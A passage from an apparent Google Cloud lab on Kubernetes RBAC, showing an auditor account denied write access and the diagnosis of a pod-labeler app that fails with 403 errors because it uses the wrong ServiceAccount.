in the namespace "dev": Required "container.services.create" permission.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): error when creating "manifests/hello-server.yaml": deployments.extensions is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot create deployments.extensions in the namespace "dev": Required "container.deployments.create" permission.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><ol start='' ><li><p><span>On the &quot;auditor&quot; instance, attempt to delete the deployment:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete deployment -n dev -l app=hello-server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): deployments.extensions "hello-server" is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot update deployments.extensions in the namespace "dev": Required "container.deployments.update" permission.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><h2 id='task-3-scenario-2-assigning-api-permissions-to-a-cluster-application'><span>Task 3. Scenario 2: Assigning API permissions to a cluster application</span></h2><p><span>In this scenario you&#39;ll go through the process of deploying an application that requires access to the Kubernetes API as well as configure RBAC rules while troubleshooting some common use cases.</span></p><h3 id='deploying-the-sample-application'><span>Deploying the sample application</span></h3><p><span>The sample application will run as a single pod that periodically retrieves all pods in the default namespace from the API server and then applies a timestamp label to each one.</span></p><ol start='' ><li><p><span>From the </span><strong><span>admin</span></strong><span> instance (this should be your first Cloud Shell tab), deploy the </span><code>pod-labeler</code><span> application. This will also deploy a Role, ServiceAccount, and RoleBinding for the pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f manifests/pod-labeler.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">role.rbac.authorization.k8s.io/pod-labeler created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">serviceaccount/pod-labeler created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rolebinding.rbac.authorization.k8s.io/pod-labeler created</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/pod-labeler created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Deploying the sample application</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='diagnosing-an-rbac-misconfiguration'><span>Diagnosing an RBAC misconfiguration</span></h3><p><span>Now check the status of the pod. Once the container has finished creating, you&#39;ll see it error out. Investigate the error by inspecting the pods&#39; events and logs.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance check the pod status:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pod-labeler-6d9757c488-tk6sp &nbsp; 0/1 &nbsp; &nbsp; &nbsp; Error &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; &nbsp;  1m</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, view the pod event stream by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl describe pod -l app=pod-labeler | tail -n 20</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Events:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Type &nbsp; &nbsp; Reason &nbsp; &nbsp; Age &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; From &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Message</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ---- &nbsp; &nbsp; ------ &nbsp; &nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Scheduled  7m35s &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; default-scheduler &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  Successfully assigned default/pod-labeler-5b4bd6cf9-w66jd to gke-rbac-demo-cluster-default-pool-3d348201-x0pk</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Pulling &nbsp;  7m34s &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  pulling image "gcr.io/pso-examples/pod-labeler:0.1.5"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Pulled &nbsp; &nbsp; 6m56s &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  Successfully pulled image "gcr.io/pso-examples/pod-labeler:0.1.5"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Created &nbsp;  5m29s (x5 over 6m56s) &nbsp; kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  Created container</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Pulled &nbsp; &nbsp; 5m29s (x4 over 6m54s) &nbsp; kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  Container image "gcr.io/pso-examples/pod-labeler:0.1.5" already present on machine</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Normal &nbsp; Started &nbsp;  5m28s (x5 over 6m56s) &nbsp; kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  Started container</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  Warning  BackOff &nbsp;  2m25s (x23 over 6m52s)  kubelet, gke-rbac-demo-cluster-default-pool-3d348201-x0pk  Back-off restarting failed container</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 450px;"></div><div class="CodeMirror-gutters" style="display: none; height: 450px;"></div></div></div></pre><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, run the following to check the pod&#39;s logs:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Attempting to list pods</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Traceback (most recent call last):</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "label_pods.py", line 13, in &lt;module&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ret = v1.list_namespaced_pod("default",watch=False)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/apis/core_v1_api.py", line 12310, in list_namespaced_pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/apis/core_v1_api.py", line 12413, in list_namespaced_pod_with_http_info</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/api_client.py", line 321, in call_api</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/api_client.py", line 155, in __call_api</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/api_client.py", line 342, in request</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/rest.py", line 231, in GET</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "build/bdist.linux-x86_64/egg/kubernetes/client/rest.py", line 222, in request</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubernetes.client.rest.ApiException: (403)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Reason: Forbidden</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP response headers: HTTPHeaderDict({'Date': 'Fri, 25 May 2018 15:33:15 GMT', 'Audit-Id': 'ae2a0d7c-2ab0-4f1f-bd0f-24107d3c144e', 'Content-Length': '307', 'Content-Type': 'application/json', 'X-Content-Type-Options': 'nosniff'})</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP response body: {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"pods is forbidden: User \"system:serviceaccount:default:default\" cannot list pods in the namespace \"default\": Unknown user \"system:serviceaccount:default:default\"","reason":"Forbidden","details":{"kind":"pods"},"code":403}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/module&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 518px;"></div><div class="CodeMirror-gutters" style="display: none; height: 518px;"></div></div></div></pre><p><span>Based on this error, you can see a permissions error when trying to list pods via the API.</span></p><ol start='' ><li><p><span>The next step is to confirm you are using the correct ServiceAccount.</span></p></li></ol><h3 id='fixing-the-serviceaccountname'><span>Fixing the serviceAccountName</span></h3><p><span>By inspecting the pod&#39;s configuration, you can see it is using the default ServiceAccount rather than the custom Service Account.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pod -oyaml -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  restartPolicy: Always</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  schedulerName: default-scheduler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  securityContext:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  fsGroup: 9999</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; 